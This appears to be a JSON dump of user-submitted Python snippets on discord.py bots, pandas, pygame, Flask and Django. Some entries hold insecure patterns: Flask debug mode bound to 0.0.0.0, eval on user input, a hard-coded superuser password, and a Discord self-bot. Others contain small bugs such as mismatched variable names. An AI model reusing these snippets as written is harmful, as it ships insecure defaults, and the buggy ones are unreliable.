    "description": "# Setting `Playing ` status await bot.change_presence(activity=discord.Game(name=\"a game\"))  # Setting `Streaming ` status await bot.change_presence(activity=discord.Streaming(name=\"My Stream\", url=my_twitch_url))  # Setting `Listening ` status await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=\"a song\"))  # Setting `Watching ` status await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=\"a movie\")) \nimport psutil from pypresence import Presence import time  client_id = '64567352374564'  # Fake ID, put your real one here RPC = Presence(client_id,pipe=0)  # Initialize the client class RPC.connect() # Start the handshake loop   while True:  # The presence will stay on as long as the program is running     cpu_per = round(psutil.cpu_percent(),1) # Get CPU Usage     mem = psutil.virtual_memory()     mem_per = round(psutil.virtual_memory().percent,1)     print(RPC.update(details=\"RAM: \"+str(mem_per)+\"%\", state=\"CPU: \"+str(cpu_per)+\"%\"))  # Set the presence     time.sleep(15) # Can only update rich presence every 15 seconds \nawait bot.change_presence(activity=discord.Game(name=\"Anything You Want\"))\n",
    "reg_date": "2021-10-12T11:28:56.000Z"
  },
  {
    "id": 852,
    "keyword": null,
    "link": null,
    "title": " discord.py send image",
    "description": "await channel.send(file=discord.File('path/to/image.png'))\nawait channel.send(file=discord.File('my_image.png'))\nimport io import aiohttp  async with aiohttp.ClientSession() as session:     async with session.get(my_url) as resp:         if resp.status != 200:             return await channel.send('Could not download file...')         data = io.BytesIO(await resp.read())         await channel.send(file=discord.File(data, 'cool_image.png')) \n",
    "reg_date": "2021-10-12T11:28:56.000Z"
  },
  {
    "id": 853,
    "keyword": null,
    "link": null,
    "title": " discord.py set activity",
    "description": "# Setting `Playing ` status await bot.change_presence(activity=discord.Game(name=\"a game\"))  # Setting `Streaming ` status await bot.change_presence(activity=discord.Streaming(name=\"My Stream\", url=my_twitch_url))  # Setting `Listening ` status await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=\"a song\"))  # Setting `Watching ` status await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=\"a movie\")) \n",
    "reg_date": "2021-10-12T11:28:56.000Z"
  },
  {
    "id": 854,
    "keyword": null,
    "link": null,
    "title": " discord.py status",
    "description": "# Setting `Playing ` status await bot.change_presence(activity=discord.Game(name=\"a game\"))  # Setting `Streaming ` status await bot.change_presence(activity=discord.Streaming(name=\"My Stream\", url=my_twitch_url))  # Setting `Listening ` status await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=\"a song\"))  # Setting `Watching ` status await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=\"a movie\"))\n# Playing ____ await bot.change_presence(activity=discord.Game(name='Minecraft')) # Streaming ____ await bot.change_presence(activity=discord.Streaming(name=\"Chess\", url=twitch_url)) # Watching ____ await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=\"Harry Potter\")) # Competing in ____ await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.competing, name=\"the House Cup\")) # Listening to ____ await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=\"!help\"))\n# Setting `Playing ` status await bot.change_presence(activity=discord.Game(name=\"a game\"))  # Setting `Streaming ` status await bot.change_presence(activity=discord.Streaming(name=\"My Stream\", url=my_twitch_url))  # Setting `Listening ` status await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=\"a song\"))  # Setting `Watching ` status await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=\"a movie\")) \n# Status to Online (The green one) await client.change_presence(status=discord.Status.online)  # Status to Idle (The orange one) await client.change_presence(status=discord.Status.idle)  # Status to Do not disturb (The red one) await client.change_presence(status=discord.Status.dnd)\n",
    "reg_date": "2021-10-12T11:28:56.000Z"
  },
  {
    "id": 855,
    "keyword": null,
    "link": null,
    "title": " discord.py tutorial",
    "description": "import discord  client = discord.Client()  @client.event async def on_ready():     print('We have logged in as {0.user}'.format(client))  @client.event async def on_message(message):     if message.author == client.user:         return      if message.content.startswith('$hello'):         await message.channel.send('Hello!')  client.run('your token here') \nimport discord  client = discord.Client()  @client.event async def on_ready():     print('Logged in as {0.user}'.format(client))  @client.event async def on_message(message):     if message.author == client.user:         return      if message.content.startswith('$hello'):         await message.channel.send('Hello!')  client.run('your token here')\nimport discord  class MyClient(discord.Client):      async def on_ready(self):         print('Logged on as', self.user)      async def on_message(self, message):         word_list = ['cheat', 'cheats', 'hack', 'hacks', 'internal', 'external', 'ddos', 'denial of service']          # don't respond to ourselves         if message.author == self.user:             return          messageContent = message.content         if len(messageContent) > 0:             for word in word_list:                 if word in messageContent:                     await message.delete()                     await message.channel.send('Do not say that!')                      messageattachments = message.attachments         if len(messageattachments) > 0:             for attachment in messageattachments:                 if attachment.filename.endswith(\".dll\"):                     await message.delete()                     await message.channel.send(\"No DLL's allowed!\")                 elif attachment.filename.endswith('.exe'):                     await message.delete()                     await message.channel.send(\"No EXE's allowed!\")                 else:                     break  client = MyClient() client.run('token here')\n#Anything commented out is optional  import discord from discord.ext import commands  bot = commands.Bot(command_prefix='prefix here')  @bot.event async def on_ready(): #   await bot.change_presence(activity=discord.Game(name=\"Rich Presence Here\"))     print('Logged in as: ' + bot.user.name)     print('Ready!\\n')      @bot.command() async def commandname(ctx, *, somevariable) #If you don't need a variable, then you only need (ctx) #\t\"\"\"Command description\"\"\" \tCode goes here \tawait ctx.send('Message')  bot.run('yourtoken')\nimport discord import os import requests import json import random from replit import db  client = discord.Client()  sad_words = [\"sad\", \"depressed\", \"unhappy\", \"angry\", \"miserable\"]  starter_encouragements = [   \"Cheer up!\",   \"Hang in there.\",   \"You are a great person / bot!\" ]  if \"responding\" not in db.keys():   db[\"responding\"] = True  def get_quote():   response = requests.get(\"https://zenquotes.io/api/random\")   json_data = json.loads(response.text)   quote = json_data[0][\"q\"] + \" -\" + json_data[0][\"a\"]   return(quote)  def update_encouragements(encouraging_message):   if \"encouragements\" in db.keys():     encouragements = db[\"encouragements\"]     encouragements.append(encouraging_message)     db[\"encouragements\"] = encouragements   else:     db[\"encouragements\"] = [encouraging_message]  def delete_encouragment(index):   encouragements = db[\"encouragements\"]   if len(encouragements) > index:     del encouragements[index]   db[\"encouragements\"] = encouragements  @client.event async def on_ready():   print(\"We have logged in as {0.user}\".format(client))  @client.event async def on_message(message):   if message.author == client.user:     return    msg = message.content    if msg.startswith(\"$inspire\"):     quote = get_quote()     await message.channel.send(quote)    if db[\"responding\"]:     options = starter_encouragements     if \"encouragements\" in db.keys():       options = options + db[\"encouragements\"]      if any(word in msg for word in sad_words):       await message.channel.send(random.choice(options))    if msg.startswith(\"$new\"):     encouraging_message = msg.split(\"$new \",1)[1]     update_encouragements(encouraging_message)     await message.channel.send(\"New encouraging message added.\")    if msg.startswith(\"$del\"):     encouragements = []     if \"encouragements\" in db.keys():       index = int(msg.split(\"$del\",1)[1])       delete_encouragment(index)       encouragements = db[\"encouragements\"]     await message.channel.send(encouragements)    if msg.startswith(\"$list\"):     encouragements = []     if \"encouragements\" in db.keys():       encouragements = db[\"encouragements\"]     await message.channel.send(encouragements)        if msg.startswith(\"$responding\"):     value = msg.split(\"$responding \",1)[1]      if value.lower() == \"true\":       db[\"responding\"] = True       await message.channel.send(\"Responding is on.\")     else:       db[\"responding\"] = False       await message.channel.send(\"Responding is off.\")  client.run(os.getenv(\"TOKEN\"))\n",
    "reg_date": "2021-10-12T11:28:56.000Z"
  },
  {
    "id": 856,
    "keyword": null,
    "link": null,
    "title": " discord.py unban command",
    "description": "@client.command() async def unban(ctx, *, member): \tbanned_users = await ctx.guild.bans() \t \tmember_name, member_discriminator = member.split('#') \tfor ban_entry in banned_users: \t\tuser = ban_entry.user \t\t \t\tif (user.name, user.discriminator) == (member_name, member_discriminator):  \t\t\tawait ctx.guild.unban(user)  \t\t\tawait ctx.channel.send(f\"Unbanned: {user.mention}\")\n@client.command() async def unban(ctx, *,member):     banned_user = await ctx.guild.bans()      member_name, member_discriminator = member.split('#')     for ban_entry in banned_users:         user = ban_entry.user          if (user.name, user.discriminator) == (member_name, member_discriminator):             await ctx.guild.unban(user)             await ctx.send(f'Unbanned {user.mention}')\n",
    "reg_date": "2021-10-12T11:28:56.000Z"
  },
  {
    "id": 857,
    "keyword": null,
    "link": null,
    "title": " discord.py unmute",
    "description": "@client.command(description=\"Unmutes a specified user.\") @commands.has_permissions(manage_messages=True) async def unmute(ctx, member: discord.Member):    mutedRole = discord.utils.get(ctx.guild.roles, name=\"Muted\")     await member.remove_roles(mutedRole)    await member.send(f\" you have unmutedd from: - {ctx.guild.name}\")    embed = discord.Embed(title=\"unmute\", description=f\" unmuted-{member.mention}\",colour=discord.Colour.light_gray())    await ctx.send(embed=embed)\n@client.command(description=\"Mutes the specified user.\") @commands.has_permissions(manage_messages=True) async def mute(ctx, member: discord.Member, *, reason=None):     guild = ctx.guild     mutedRole = discord.utils.get(guild.roles, name=\"Muted\")      if not mutedRole:         mutedRole = await guild.create_role(name=\"Muted\")          for channel in guild.channels:             await channel.set_permissions(mutedRole, speak=False, send_messages=False, read_message_history=True, read_messages=False)     embed = discord.Embed(title=\"muted\", description=f\"{member.mention} was muted \", colour=discord.Colour.light_gray())     embed.add_field(name=\"reason:\", value=reason, inline=False)     await ctx.send(embed=embed)     await member.add_roles(mutedRole, reason=reason)     await member.send(f\" you have been muted from: {guild.name} reason: {reason}\") \n@client.command() async def tempmute(ctx, member: discord.Member, time: int, d, *, reason=None):     guild = ctx.guild      for role in guild.roles:         if role.name == \"Muted\":             await member.add_roles(role)              embed = discord.Embed(title=\"muted!\", description=f\"{member.mention} has been tempmuted \", colour=discord.Colour.light_gray())             embed.add_field(name=\"reason:\", value=reason, inline=False)             embed.add_field(name=\"time left for the mute:\", value=f\"{time}{d}\", inline=False)             await ctx.send(embed=embed)              if d == \"s\":                 await asyncio.sleep(time)              if d == \"m\":                 await asyncio.sleep(time*60)              if d == \"h\":                 await asyncio.sleep(time*60*60)              if d == \"d\":                 await asyncio.sleep(time*60*60*24)              await member.remove_roles(role)              embed = discord.Embed(title=\"unmute (temp) \", description=f\"unmuted -{member.mention} \", colour=discord.Colour.light_gray())             await ctx.send(embed=embed)              return \n",
    "reg_date": "2021-10-12T11:28:56.000Z"
  },
  {
    "id": 858,
    "keyword": null,
    "link": null,
    "title": " discord.py watching status",
    "description": "# Setting `Playing ` status await bot.change_presence(activity=discord.Game(name=\"a game\"))  # Setting `Streaming ` status await bot.change_presence(activity=discord.Streaming(name=\"My Stream\", url=my_twitch_url))  # Setting `Listening ` status await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=\"a song\"))  # Setting `Watching ` status await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=\"a movie\"))\n",
    "reg_date": "2021-10-12T11:28:56.000Z"
  },
  {
    "id": 859,
    "keyword": null,
    "link": null,
    "title": " discord bot status python",
    "description": "# Setting `Playing ` status await bot.change_presence(activity=discord.Game(name=\"a game\"))  # Setting `Streaming ` status await bot.change_presence(activity=discord.Streaming(name=\"My Stream\", url=my_twitch_url))  # Setting `Listening ` status await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=\"a song\"))  # Setting `Watching ` status await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=\"a movie\"))\n# Status to Online (The green one) await client.change_presence(status=discord.Status.online)  # Status to Idle (The orange one) await client.change_presence(status=discord.Status.idle)  # Status to Do not disturb (The red one) await client.change_presence(status=discord.Status.dnd)\nimport discord  class MyClient(discord.Client):      async def on_ready(self):         print('Logged on as', self.user)      async def on_message(self, message):         word_list = ['cheat', 'cheats', 'hack', 'hacks', 'internal', 'external', 'ddos', 'denial of service']          # don't respond to ourselves         if message.author == self.user:             return          messageContent = message.content         if len(messageContent) > 0:             for word in word_list:                 if word in messageContent:                     await message.delete()                     await message.channel.send('Do not say that!')                      messageattachments = message.attachments         if len(messageattachments) > 0:             for attachment in messageattachments:                 if attachment.filename.endswith(\".dll\"):                     await message.delete()                     await message.channel.send(\"No DLL's allowed!\")                 elif attachment.filename.endswith('.exe'):                     await message.delete()                     await message.channel.send(\"No EXE's allowed!\")                 else:                     break  client = MyClient() client.run('token here')\n",
    "reg_date": "2021-10-12T11:28:56.000Z"
  },
  {
    "id": 860,
    "keyword": null,
    "link": null,
    "title": " discord identity python  html avatar",
    "description": "@client.command() async def avatar(ctx, *,  avamember : discord.Member=None):     userAvatarUrl = avamember.avatar_url     await ctx.send(userAvatarUrl)\n",
    "reg_date": "2021-10-12T11:28:57.000Z"
  },
  {
    "id": 861,
    "keyword": null,
    "link": null,
    "title": " discord py bot status",
    "description": "# Setting `Playing ` status await bot.change_presence(activity=discord.Game(name=\"a game\"))  # Setting `Streaming ` status await bot.change_presence(activity=discord.Streaming(name=\"My Stream\", url=my_twitch_url))  # Setting `Listening ` status await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=\"a song\"))  # Setting `Watching ` status await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=\"a movie\"))\n# Setting `Playing ` status await bot.change_presence(activity=discord.Game(name=\"a game\"))  # Setting `Streaming ` status await bot.change_presence(activity=discord.Streaming(name=\"My Stream\", url=my_twitch_url))  # Setting `Listening ` status await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=\"a song\"))  # Setting `Watching ` status await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=\"a movie\")) \n# Status to Online (The green one) await client.change_presence(status=discord.Status.online)  # Status to Idle (The orange one) await client.change_presence(status=discord.Status.idle)  # Status to Do not disturb (The red one) await client.change_presence(status=discord.Status.dnd)\n",
    "reg_date": "2021-10-12T11:28:57.000Z"
  },
  {
    "id": 862,
    "keyword": null,
    "link": null,
    "title": " discord py on ready",
    "description": "@client.event\t\t\t# Tells Discord that it's a event async def on_ready():\t# Important that the    \t\t\t\t\t\t# name of the event is      \t\t\t\t\t# \"on_ready\"     print(\"Ready!\")\t\t# Prints ready to the console \nimport discord  client = discord.Client()  @client.event async def on_ready():     print('Logged in as {0.user}'.format(client))  @client.event async def on_message(message):     if message.author == client.user:         return      if message.content.startswith('$hello'):         await message.channel.send('Hello!')  client.run('your token here')\nimport discord  client = discord.Client()  @client.event async def on_ready():     print('We have logged in as {0.user}'.format(client))  @client.event async def on_message(message):     if message.author == client.user:         return      if message.content.startswith('$hello'):         await message.channel.send('Hello!')  client.run('your token here')\n",
    "reg_date": "2021-10-12T11:28:57.000Z"
  },
  {
    "id": 863,
    "keyword": null,
    "link": null,
    "title": " discord self bot python",
    "description": "#Discord self bot python:  from discord.ext import commands  bot = commands.Bot(\">>>\", self_bot=True)  @bot.event async def on_ready():     print(\"Bot presence t u r n e d on ( ͡&deg; ͜ʖ ͡&deg;)\")  @bot.command() async def test(ctx):     await ctx.send(\"oof\")  bot.run(\"my token\", bot=False)\n",
    "reg_date": "2021-10-12T11:28:57.000Z"
  },
  {
    "id": 864,
    "keyword": null,
    "link": null,
    "title": " discordpy status",
    "description": "# Setting `Playing ` status await bot.change_presence(activity=discord.Game(name=\"a game\"))  # Setting `Streaming ` status await bot.change_presence(activity=discord.Streaming(name=\"My Stream\", url=my_twitch_url))  # Setting `Listening ` status await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=\"a song\"))  # Setting `Watching ` status await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=\"a movie\"))\n",
    "reg_date": "2021-10-12T11:28:57.000Z"
  },
  {
    "id": 865,
    "keyword": null,
    "link": null,
    "title": " display Max rows in a pandas dataframe",
    "description": "pandas.set_option('display.max_rows', None)\n",
    "reg_date": "2021-10-12T11:28:57.000Z"
  },
  {
    "id": 866,
    "keyword": null,
    "link": null,
    "title": " display all categorical column in pandas dataframe",
    "description": "# get all categorical columns in the dataframe catCols = [col for col in df.columns if df[col].dtype==\"O\"]\n",
    "reg_date": "2021-10-12T11:28:57.000Z"
  },
  {
    "id": 867,
    "keyword": null,
    "link": null,
    "title": " display cv2 image in jupyter notebook",
    "description": "# matplotlib interprets images in RGB format, but OpenCV uses BGR format  # so to convert the image so that it's properly loaded, convert it before loading  img = cv2.imread('filename.ext')\t\t# this is read in BGR format rgb_img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)\t\t# this converts it into RGB  plt.imshow(rgb_img) plt.show() \n",
    "reg_date": "2021-10-12T11:28:57.000Z"
  },
  {
    "id": 868,
    "keyword": null,
    "link": null,
    "title": " display flask across network",
    "description": "from flask import Flask  app = Flask(__name__)  @app.route('/') def index():   return \"Hello world!\"   if __name__ == '__main__':     app.debug = True     app.run(host=\"0.0.0.0\") #host=\"0.0.0.0\" will make the page accessable                             #by going to http://[ip]:5000/ on any computer in                              #the network.\n",
    "reg_date": "2021-10-12T11:28:57.000Z"
  },
  {
    "id": 869,
    "keyword": null,
    "link": null,
    "title": " display full dataframe pandas",
    "description": "pd.set_option('display.max_rows', None) pd.set_option('display.max_columns', None) pd.set_option('display.width', None) pd.set_option('display.max_colwidth', None)\npd.set_option('display.max_rows', None, 'display.max_columns', None)\n",
    "reg_date": "2021-10-12T11:28:57.000Z"
  },
  {
    "id": 870,
    "keyword": null,
    "link": null,
    "title": " display maximum columns pandas",
    "description": "import pandas as pd pd.set_option('display.max_rows', 500) pd.set_option('display.max_columns', 500) pd.set_option('display.width', 1000)\npd.options.display.max_columns = 999 pd.options.display.max_rows = 999 \n",
    "reg_date": "2021-10-12T11:28:58.000Z"
  },
  {
    "id": 871,
    "keyword": null,
    "link": null,
    "title": " display np array as image",
    "description": "from PIL import Image import numpy as np  w, h = 512, 512 data = np.zeros((h, w, 3), dtype=np.uint8) data[0:256, 0:256] = [255, 0, 0] # red patch in upper left img = Image.fromarray(data, 'RGB') img.save('my.png') img.show()\n",
    "reg_date": "2021-10-12T11:28:58.000Z"
  },
  {
    "id": 872,
    "keyword": null,
    "link": null,
    "title": " display python 001",
    "description": "print(\"{:03d}\".format(1))\n",
    "reg_date": "2021-10-12T11:28:58.000Z"
  },
  {
    "id": 873,
    "keyword": null,
    "link": null,
    "title": " display text in pygame",
    "description": "import pygame pygame.init() window = pygame.display.set_mode((500, 500))   def set_text(string, coordx, coordy, fontSize): #Function to set text      font = pygame.font.Font('freesansbold.ttf', fontSize)      #(0, 0, 0) is black, to make black text     text = font.render(string, True, (0, 0, 0))      textRect = text.get_rect()     textRect.center = (coordx, coordy)      return (text, textRect)  window.fill((255, 255, 255)) #Fills the whole window with white #Places \"Text in Pygame!\" with an x,y coord of 250, 250 and 60 font size totalText = set_text(\"Text in Pygame!\", 250, 250, 60) window.blit(totalText[0], totalText[1]) pygame.display.update()\ndef writeText(string, coordx, coordy, fontSize):   \t#set the font to write with     font = pygame.font.Font('freesansbold.ttf', fontSize)      #(0, 0, 0) is black, to make black text     text = font.render(string, True, (0, 0, 0))     #get the rect of the text     textRect = text.get_rect()     #set the position of the text     textRect.center = (coordx, coordy)     #add text to window \twindow.blit(text, textRect)     #update window \tpygame.display.update()\n\"\"\"system font\"\"\" font = pygame.font.SysFont(\"Segoe UI\", 35)  \"\"\"font from .ttf file\"\"\" font = pygame.font.Font(\"path/to/font.ttf\", 35)  textsurface = font.render(\"text\", False, color)  # \"text\", antialias, color surface.blit(textsurface, (x, y))\nfont = pygame.font.SysFont(None, 24) img = font.render('hello', True, BLUE) screen.blit(img, (20, 20))\n",
    "reg_date": "2021-10-12T11:28:58.000Z"
  },
  {
    "id": 874,
    "keyword": null,
    "link": null,
    "title": " distance euc of two arrays python",
    "description": "# Use numpy.linalg.norm: import numpy as np  a = np.array([1.0, 3.5, -6.3]) b = np.array([4.5, 1.6,  1.2])  dist = np.linalg.norm(a-b)\n# I hope to be of help and to have understood the request from math import sqrt # import square root from the math module # the x and y coordinates are the points on the Cartesian plane pointA = (x, y) # first point pointB = (x, y) # second point distance = calc_distance(pointA, pointB) # here your beautiful result def calc_distance(p1, p2): # simple function, I hope you are more comfortable   return sqrt((p1[0]-p2[0])**2+(p1[1]-p2[1])**2) # Pythagorean theorem\n",
    "reg_date": "2021-10-12T11:28:58.000Z"
  },
  {
    "id": 875,
    "keyword": null,
    "link": null,
    "title": " distance formula in python",
    "description": "import math. def calculateDistance(x1,y1,x2,y2): dist = math.sqrt((x2 - x1)**2 + (y2 - y1)**2) return dist. print calculateDistance(x1, y1, x2, y2)\nimport math p1 = [4, 0] p2 = [6, 6] distance = math.sqrt( ((p1[0]-p2[0])**2)+((p1[1]-p2[1])**2) )  print(distance)\nfrom math import sqrt def main(): \tpoint1x, point1y = eval(input(\"Please enter coordinates of Point1 (use commas) \")) \tpoint2x, point2y = eval(input(\"Please enter coordinates of Point2 (use commas)\")) \t \tDistance = sqrt((point1x-point2x)**2 + (point1y-point2y)**2) \tprint(\"The distance between this two points is\", str(round(Distance, 4))+\" units\")\n",
    "reg_date": "2021-10-12T11:28:58.000Z"
  },
  {
    "id": 876,
    "keyword": null,
    "link": null,
    "title": " distance matrix in python",
    "description": ">>> from scipy.spatial import distance_matrix >>> distance_matrix([[0,0],[0,1]], [[1,0],[1,1]]) array([[ 1.        ,  1.41421356],        [ 1.41421356,  1.        ]]) \n",
    "reg_date": "2021-10-12T11:28:58.000Z"
  },
  {
    "id": 877,
    "keyword": null,
    "link": null,
    "title": " divide by zero error python exception handling",
    "description": "try:     print 1/0 except ZeroDivisionError:     print \"You can't divide by zero!\" \nPython will display \"ZeroDivisionError\" if you divide something with zero\n",
    "reg_date": "2021-10-12T11:28:58.000Z"
  },
  {
    "id": 878,
    "keyword": null,
    "link": null,
    "title": " django-admin command not found",
    "description": "python -m django startproject monnify\n",
    "reg_date": "2021-10-12T11:28:58.000Z"
  },
  {
    "id": 879,
    "keyword": null,
    "link": null,
    "title": " django-tool-bar",
    "description": "$ python -m pip install django-debug-toolbar \nINSTALLED_APPS = [     # ...     'django.contrib.staticfiles',     # ...     'debug_toolbar', ]  STATIC_URL = '/static/' \nINTERNAL_IPS = [     # ...     '127.0.0.1',     # ... ] \nimport debug_toolbar from django.conf import settings from django.urls import include, path  urlpatterns = [     ...     path('__debug__/', include(debug_toolbar.urls)), ] \n$ python -m pip install -e git+https://github.com/jazzband/django-debug-toolbar.git#egg=django-debug-toolbar \nMIDDLEWARE = [     # ...     'debug_toolbar.middleware.DebugToolbarMiddleware',     # ... ] \n",
    "reg_date": "2021-10-12T11:28:58.000Z"
  },
  {
    "id": 880,
    "keyword": null,
    "link": null,
    "title": " django.core.exceptions.ImproperlyConfigured: WSGI application 'souroSANOU.wsgi.application' could not be loaded; Error importing module.",
    "description": "Change the line in settings.py as below  WSGI_APPLICATION = 'application' to WSGI_APPLICATION = 'wsgi.application'\n",
    "reg_date": "2021-10-12T11:28:59.000Z"
  },
  {
    "id": 881,
    "keyword": null,
    "link": null,
    "title": " django.core.exceptions.ImproperlyConfigured",
    "description": "import os import django  os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'appname.settings') django.setup()  # all imports must go below here\n",
    "reg_date": "2021-10-12T11:28:59.000Z"
  },
  {
    "id": 882,
    "keyword": null,
    "link": null,
    "title": " django.db.utils.OperationalError: no such table:",
    "description": "python manage.py makemigrations python manage.py migrate\nfind . -path \"*/migrations/*.py\" -not -name \"__init__.py\" -delete  find . -path \"*/migrations/*.pyc\"  -delete\nrm db.sqlite3\n",
    "reg_date": "2021-10-12T11:28:59.000Z"
  },
  {
    "id": 883,
    "keyword": null,
    "link": null,
    "title": " django 3 add template folder",
    "description": "from pathlib import Path  BASE_DIR = Path(__file__).resolve().parent.parent TEMPLATES_DIR = [BASE_DIR.joinpath('template1'), ] TEMPLATES = [     {         'BACKEND': 'django.template.backends.django.DjangoTemplates',         'DIRS': TEMPLATE_DIRS,         'APP_DIRS': True,         'OPTIONS': {             'context_processors': [                 'django.template.context_processors.debug',                 'django.template.context_processors.request',                 'django.contrib.auth.context_processors.auth',                 'django.contrib.messages.context_processors.messages',             ],         },     }, ]\nPROJECT_ROOT = os.path.abspath(os.path.dirname(__file__))  TEMPLATE_DIRS = (     # Put strings here, like \"/home/html/django_templates\" or \"C:/www/django/templates\".     # Always use forward slashes, even on Windows.     # Don't forget to use absolute paths, not relative paths.     os.path.join(PROJECT_ROOT, 'templates').replace('\\\\','/'), )  # List of callables that know how to import templates from various sources. TEMPLATE_LOADERS = (     'django.template.loaders.filesystem.Loader',     'django.template.loaders.app_directories.Loader', #     'django.template.loaders.eggs.Loader', ) \n",
    "reg_date": "2021-10-12T11:28:59.000Z"
  },
  {
    "id": 884,
    "keyword": null,
    "link": null,
    "title": " django EMAIL BACKEND console",
    "description": "EMAIL_BACKEND = 'django.core.mail.backends.console.EmailBackend'  '''Console backend&para; Instead of sending out real emails the console backend just writes the emails that would be sent to the standard output. By default, the console backend writes to stdout. You can use a different stream-like object by providing the stream keyword argument when constructing the connection.  To specify this backend, put the following in your settings:'''\n",
    "reg_date": "2021-10-12T11:28:59.000Z"
  },
  {
    "id": 885,
    "keyword": null,
    "link": null,
    "title": " django That port is already in use",
    "description": "sudo lsof -t -i tcp:8000 | xargs kill -9\nsudo fuser -k 8000/tcp\nKill port django\n",
    "reg_date": "2021-10-12T11:28:59.000Z"
  },
  {
    "id": 886,
    "keyword": null,
    "link": null,
    "title": " django admin create superuser",
    "description": "$ python manage.py createsuperuser\npython3 manage.py createsuperuser\n$ python manage.py createsuperuser \nfrom django.core.management.base import BaseCommand, CommandError from django.contrib.auth.models import User  class Command(BaseCommand):      def handle(self, *args, **options):          # The magic line         User.objects.create_user(username= 'rmx',                                 email='superuser@super.com',                                 password='rmx55',                                 is_staff=True,                                 is_active=True,                                 is_superuser=True         ) \nPassword: ********** Password (again): ********* Superuser created successfully. \nUsername: admin \n",
    "reg_date": "2021-10-12T11:28:59.000Z"
  },
  {
    "id": 887,
    "keyword": null,
    "link": null,
    "title": " django admin prefetch related",
    "description": "from django.contrib import admin  class MyModelAdmin(admin.ModelAdmin):     def get_queryset(self, request):         queryset = super(MyModelAdmin, self).get_queryset(request)         queryset = queryset.prefetch_related('user')         return queryset \n",
    "reg_date": "2021-10-12T11:28:59.000Z"
  },
  {
    "id": 888,
    "keyword": null,
    "link": null,
    "title": " django admin register mdoel",
    "description": "from django.contrib import admin from myproject.myapp.models import Author  admin.site.register(Author) \nfrom django.contrib import admin from .models import Author  @admin.register(Author) class AuthorAdmin(admin.ModelAdmin):     pass \n",
    "reg_date": "2021-10-12T11:29:00.000Z"
  },
  {
    "id": 889,
    "keyword": null,
    "link": null,
    "title": " django admin slug auto populate",
    "description": " #models.py from django.db import models  from django_extensions.db.fields import AutoSlugField  class MyModel(models.Model):     title = models.CharField(max_length=42)     slug = AutoSlugField(populate_from=['title', 'description', 'get_author_name'])\n",
    "reg_date": "2021-10-12T11:29:00.000Z"
  },
  {
    "id": 890,
    "keyword": null,
    "link": null,
    "title": " django and operator",
    "description": "Model.objects.filter(Q(id='test1') & Q(id='test2'))\nModel.objects.filter(Q(id='test1') | Q(id='test2'))\n",
    "reg_date": "2021-10-12T11:29:00.000Z"
  },
  {
    "id": 891,
    "keyword": null,
    "link": null,
    "title": " django authenticate",
    "description": "from django.contrib.auth import authenticate\nfrom django.contrib.auth import authenticate, login  def my_view(request):     username = request.POST['username']     password = request.POST['password']     user = authenticate(request, username=username, password=password)     if user is not None:         login(request, user)         # Redirect to a success page.         ...     else:         # Return an 'invalid login' error message.         ... \nfrom django.contrib.auth import authenticate, login\nfrom django.contrib.auth import get_user_model from django.contrib.auth.backends import ModelBackend  class EmailBackend(ModelBackend):     def authenticate(self, request, username=None, password=None, **kwargs):         UserModel = get_user_model()         try:             user = UserModel.objects.get(email=username)         except UserModel.DoesNotExist:             return None         else:             if user.check_password(password):                 return user         return None\n",
    "reg_date": "2021-10-12T11:29:00.000Z"
  },
  {
    "id": 892,
    "keyword": null,
    "link": null,
    "title": " django create app",
    "description": "python manage.py startapp app_name\n# to start a django server cd to dir with manage.py file and type following python manage.py runserver \npython manage.py startapp # name of the app\ndjango-admin startproject mysite\n$ python manage.py startapp app_name\n$ python manage.py startapp polls \n",
    "reg_date": "2021-10-12T11:29:00.000Z"
  },
  {
    "id": 893,
    "keyword": null,
    "link": null,
    "title": " django create app command",
    "description": "python manage.py startapp app_name\npython manage.py startapp # name of the app\n$ python manage.py startapp app_name\n...\\> django-admin startproject project_name\n",
    "reg_date": "2021-10-12T11:29:00.000Z"
  },
  {
    "id": 894,
    "keyword": null,
    "link": null,
    "title": " django create empty migration",
    "description": "$ python3 manage.py makemigrations $ python3 manage.py migrate\n./manage.py makemigrations <app-name> --empty ./manage.py makemigrations --empty\n//to create migration files python manage.py makemigrations  //to migrate migration files python manage.py migrate \npickle\n",
    "reg_date": "2021-10-12T11:29:00.000Z"
  },
  {
    "id": 895,
    "keyword": null,
    "link": null,
    "title": " django create model from dictionary",
    "description": "# create instance of model m = MyModel(**data_dict) # don't forget to save to database! m.save()\n",
    "reg_date": "2021-10-12T11:29:00.000Z"
  },
  {
    "id": 896,
    "keyword": null,
    "link": null,
    "title": " django debug toolbar",
    "description": "$ python -m pip install django-debug-toolbar \n",
    "reg_date": "2021-10-12T11:29:01.000Z"
  },
  {
    "id": 897,
    "keyword": null,
    "link": null,
    "title": " django delete object",
    "description": "SomeModel.objects.filter(id=id).delete()\nclass Thing(object):     # The function below runs when this object is deleted.     # I just put it there so you can visulise it properly.     def __del__(self):          print(\"Object was deleted.\")          def func(self):         print(\"Random function ran from class Thing().\")  random_object = Thing() random_object.func() # Run the function so you know the class exists. del random_object # Delete the object. Will run the __del__ function when done this.  # Try to run the func() function now, it won't run because the object is deleted. random_object.func() # Produces NameError.\nAuthor.objects.create(name=\"Joe\")\n>>> one_entry = Entry.objects.get(pk=1) \npk is short for primary key, which is a unique identifier for each  record in a database.\n",
